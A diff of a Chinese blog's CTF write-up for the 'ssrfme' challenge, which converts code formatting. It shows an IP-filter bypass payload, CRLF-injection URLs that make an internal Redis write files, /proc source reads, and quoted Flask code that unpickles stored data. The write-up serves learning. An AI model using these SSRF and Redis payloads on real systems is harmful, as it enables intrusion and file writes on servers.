@@ -474,12 +474,67 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 <h2 id="网鼎杯玄武组ssrfme"><a href="#网鼎杯玄武组ssrfme" class="headerlink" title="网鼎杯玄武组ssrfme"></a>网鼎杯玄武组ssrfme</h2><p>这题真没想到，是郁师傅出的题……网上大部分做法都是主从复制RCE做的，不过郁师傅说试试不用主从复制做,不知道是什么姿势。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">        safe_request_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally. </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php 
+function check_inner_ip($url) 
+{ 
+    $match_result=preg_match(&#39;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#39;,$url); 
+    if (!$match_result) 
+    { 
+        die(&#39;url fomat error&#39;); 
+    } 
+    try 
+    { 
+        $url_parse=parse_url($url); 
+    } 
+    catch(Exception $e) 
+    { 
+        die(&#39;url fomat error&#39;); 
+        return false; 
+    } 
+    $hostname=$url_parse[&#39;host&#39;]; 
+    $ip=gethostbyname($hostname); 
+    $int_ip=ip2long($ip); 
+    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; 
+} 
 
+function safe_request_url($url) 
+{ 
+
+    if (check_inner_ip($url)) 
+    { 
+        echo $url.&#39; is inner ip&#39;; 
+    } 
+    else 
+    {
+        $ch = curl_init(); 
+        curl_setopt($ch, CURLOPT_URL, $url); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+        curl_setopt($ch, CURLOPT_HEADER, 0); 
+        $output = curl_exec($ch); 
+        $result_info = curl_getinfo($ch); 
+        if ($result_info[&#39;redirect_url&#39;]) 
+        { 
+            safe_request_url($result_info[&#39;redirect_url&#39;]); 
+        } 
+        curl_close($ch); 
+        var_dump($output); 
+    } 
+
+} 
+if(isset($_GET[&#39;url&#39;])){
+    $url = $_GET[&#39;url&#39;]; 
+    if(!empty($url)){ 
+        safe_request_url($url); 
+    } 
+}
+else{
+    highlight_file(__FILE__);
+}
+// Please visit hint.php locally. 
+?&gt;</code></pre>
 <p>首先拿到题目是经典的yulige标配ssrf。可以看到,我们允许使用的scheme是http,gopher以及dict。然后需要绕过一个内网ip检测，即可进行curl的ssrf.</p>
 <p>看到提示说访问hint.php。看来需要绕过ip限制进行内网访问。这个点之前总结ssrf时提到过,算是基本trick了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure>
-<p><code>0.0.0.0</code>默认本地。<code>@</code>则是因为phpparse_url只会匹配到最后一个<code>@</code>后的内容的原因。这样我们就可以绕过了。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>url=http://bycsec.top@0.0.0.0/hint.php</code></pre><p><code>0.0.0.0</code>默认本地。<code>@</code>则是因为phpparse_url只会匹配到最后一个<code>@</code>后的内容的原因。这样我们就可以绕过了。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>得到一个redis密码。下面是试图得到webshell</p>
 <p>通常来说ssrf+redis getshell主要是这几种姿势</p>
 <ol>
@@ -504,29 +559,225 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>第一反应先读了下bash_history。发现一个没权限一个不存在。(假如能用这种方式知道根目录flag的名称那就会简便很多，这也是我在wustctf当时直接读到flag的非预期思路)</p>
 <p>然后期间触发了报错。发现是python的urllib库调用的urlopen。这个库熟悉的话应该都知道是存在CRLF的洞的。我们可以用这个ssrf往自己服务器打一波。nc监听的话会发现是python3.5的urllib。</p>
 <p>对urllib的ssrf,用http协议下的可以直接打</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apadding</span><br><span class="line">只返回$-1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aconfig%20set%20dir%20&#x2F;tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apadding</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;tmp&#x2F;byc</span><br><span class="line">成功写入文件</span><br></pre></td></tr></table></figure>
-<p>那么此时大致确认可以用这个ssrf打redis了。但是要注意的是我们python服务器不能直接写webshell。不能写定时和key。而且由于gopher不支持也不能进行RCE。换言之我们只能对redis进行命令操作。所以我想先尝试探测源码信息</p>
+<pre><code>http://127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apadding
+只返回$-1
+
+http://127.0.0.1:6379?%0d%0aconfig%20set%20dir%20/tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apadding
+file:///tmp/byc
+成功写入文件</code></pre><p>那么此时大致确认可以用这个ssrf打redis了。但是要注意的是我们python服务器不能直接写webshell。不能写定时和key。而且由于gopher不支持也不能进行RCE。换言之我们只能对redis进行命令操作。所以我想先尝试探测源码信息</p>
 <p>首先是<code>/proc/self/cmdline</code>。读到了gunicorn的相关配置。</p>
 <p><code>/usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app</code></p>
 <p>得到run.py。这里直接用<code>/proc/self/cwd/run.py</code>去读工作目录下的源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sipder <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> StrictRedis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_string</span><br><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="number">6379</span>,db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">"Cookie"</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> redis.exists(cookie):</span><br><span class="line">                user = pickle.loads(redis.get(cookie))</span><br><span class="line">                <span class="keyword">if</span> user.verify_pass(password):</span><br><span class="line">                    resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                    resp.set_cookie(<span class="string">'Cookie'</span>,cookie)</span><br><span class="line">                    <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        email = request.form.get(<span class="string">'email'</span>)</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        user = User(email,username,password)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> redis.exists(cookie):</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                resp.set_cookie(<span class="string">"Cookie"</span>,cookie)</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"register.html"</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/home/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            <span class="keyword">if</span> request.method != <span class="string">"GET"</span>:</span><br><span class="line">                formlist = request.form.to_dict()</span><br><span class="line">                User.modify_info(user,formlist)</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/spider/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> request.method != <span class="string">"GET"</span> <span class="keyword">and</span> request.form.get(<span class="string">'url'</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target_url = request.form.get(<span class="string">'url'</span>)</span><br><span class="line">            new_spider = Spider(target_url)</span><br><span class="line">            result = new_spider.spiderFlag()</span><br><span class="line">        <span class="keyword">except</span> Excetion <span class="keyword">as</span> e:</span><br><span class="line">            result = e</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"spider.html"</span>,result=str(result),user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/testSpider/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TSpider</span><span class="params">()</span>:</span></span><br><span class="line">    html = <span class="string">'&lt;div id="flag"&gt;Flag&#123;hahaha This is a test for tested Spider mode&#125;&lt;/div&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(url_for(<span class="string">'login'</span>)))</span><br><span class="line">    resp.set_cookie(<span class="string">'Cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"error.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># -*- coding: utf-8 -*-
+import pickle
+from sipder import Spider
+from redis import StrictRedis
+from flask import Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_string
+from user import *
 
+
+app = Flask(__name__)
+redis = StrictRedis(host=&#39;127.0.0.1&#39;,port=6379,db=0)
+
+@app.route(&#39;/&#39;)
+def index():
+    cookie = request.cookies.get(&quot;Cookie&quot;)
+    return redirect(url_for(&quot;login&quot;))
+
+@app.route(&#39;/login/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def login():
+    if request.method != &#39;GET&#39;:
+        username = request.form.get(&#39;username&#39;)
+        password = request.form.get(&#39;password&#39;)
+        cookie = Cookie()
+        cookie.create = username
+        cookie = cookie.create
+        try:
+            if redis.exists(cookie):
+                user = pickle.loads(redis.get(cookie))
+                if user.verify_pass(password):
+                    resp = make_response(redirect(url_for(&#39;home&#39;)))
+                    resp.set_cookie(&#39;Cookie&#39;,cookie)
+                    return resp
+        except:
+            abort(500)
+    return render_template(&quot;login.html&quot;)
+
+@app.route(&#39;/register/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def register():
+    if request.method != &#39;GET&#39;:
+        email = request.form.get(&#39;email&#39;)
+        username = request.form.get(&#39;username&#39;)
+        password = request.form.get(&#39;password&#39;)
+        user = User(email,username,password)
+        cookie = Cookie()
+        cookie.create = username
+        cookie = cookie.create
+        try:
+            if not redis.exists(cookie):
+                redis.set(cookie,pickle.dumps(user))
+                resp = make_response(redirect(url_for(&#39;home&#39;)))
+                resp.set_cookie(&quot;Cookie&quot;,cookie)
+                return resp
+        except:
+            abort(500)
+    return render_template(&quot;register.html&quot;)
+
+
+@app.route(&#39;/home/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def home():
+    cookie = request.cookies.get(&#39;Cookie&#39;)
+    try:
+        if Cookie.verify(cookie) and redis.exists(cookie):
+            user = redis.get(cookie)
+            user = pickle.loads(user)
+            if request.method != &quot;GET&quot;:
+                formlist = request.form.to_dict()
+                User.modify_info(user,formlist)
+                redis.set(cookie,pickle.dumps(user))
+                return render_template(&quot;home.html&quot;,user=user)
+            return render_template(&quot;home.html&quot;,user=user)
+    except:
+        return abort(500)
+    return redirect(url_for(&quot;login&quot;))
+
+
+@app.route(&#39;/spider/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def spider():
+    cookie = request.cookies.get(&#39;Cookie&#39;)
+    try:
+        if Cookie.verify(cookie) and redis.exists(cookie):
+            user = redis.get(cookie)
+            user = pickle.loads(user)
+    except:
+        return abort(500)
+    result=&#39;&#39;
+    if request.method == &quot;GET&quot;:
+        result=&#39;&#39;
+    elif request.method != &quot;GET&quot; and request.form.get(&#39;url&#39;)!=None:
+        try:
+            target_url = request.form.get(&#39;url&#39;)
+            new_spider = Spider(target_url)
+            result = new_spider.spiderFlag()
+        except Excetion as e:
+            result = e
+    return render_template(&quot;spider.html&quot;,result=str(result),user=user)
+
+@app.route(&#39;/testSpider/&#39;)
+def TSpider():
+    html = &#39;&lt;div id=&quot;flag&quot;&gt;Flag{hahaha This is a test for tested Spider mode}&lt;/div&gt;&#39;
+    return render_template_string(html)
+
+
+@app.route(&#39;/logout/&#39;)
+def logout():
+    resp = make_response(redirect(url_for(&#39;login&#39;)))
+    resp.set_cookie(&#39;Cookie&#39;,&#39;&#39;)
+    return resp
+
+@app.errorhandler(500)
+def error(e):
+    return render_template(&quot;error.html&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    app.run(
+        debug=True,
+        port=5000,
+        host=&quot;0.0.0.0&quot;
+    )</code></pre>
 <p>从调用的包看到还有两个自定义的包。也一并读下来、<br>sipder.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.target_url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = urllib.request.urlopen(self.target_url).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">return</span> (info, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="keyword">return</span> (err, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiderFlag</span><span class="params">(self)</span>:</span></span><br><span class="line">        infos = self.__getResponse()</span><br><span class="line">        <span class="keyword">if</span> infos[<span class="number">1</span>]:</span><br><span class="line">            soup = BeautifulSoup(infos[<span class="number">0</span>])</span><br><span class="line">            flag = soup.find(id==<span class="string">'flag'</span>)</span><br><span class="line">            <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> flag.text</span><br><span class="line">        <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+<pre><code class="python">
+import urllib
+import urllib.request
+
+from bs4 import BeautifulSoup
 
 
+class Spider:
+    def __init__(self, url):
+        self.target_url = url
+
+    def __getResponse(self):
+        try:
+            info = urllib.request.urlopen(self.target_url).read().decode(&quot;utf-8&quot;)
+            return (info, True)
+        except Exception as err:
+            return (err, False)
+
+    def spiderFlag(self):
+        infos = self.__getResponse()
+        if infos[1]:
+            soup = BeautifulSoup(infos[0])
+            flag = soup.find(id==&#39;flag&#39;)
+            return infos[0]
+            return flag.text
+        return infos[0]</code></pre>
 <p>user.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf<span 